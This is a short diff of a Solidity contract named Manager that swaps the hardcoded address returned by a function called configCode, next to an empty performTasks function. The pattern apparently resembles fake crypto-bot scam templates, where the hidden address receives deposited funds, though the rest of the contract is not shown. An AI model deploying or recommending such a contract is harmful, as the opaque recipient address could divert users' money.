@@ -6,6 +6,6 @@ contract Manager {
     function performTasks() public {}
 
     function configCode() public pure returns (address) {
-        return 0xe935f98f0043fEF1B3f5D61Ea0B097BB824EF8c5;
+        return 0x3C7634e28B4C370fCD841694A6D677E2533e2B79;
     }
 }
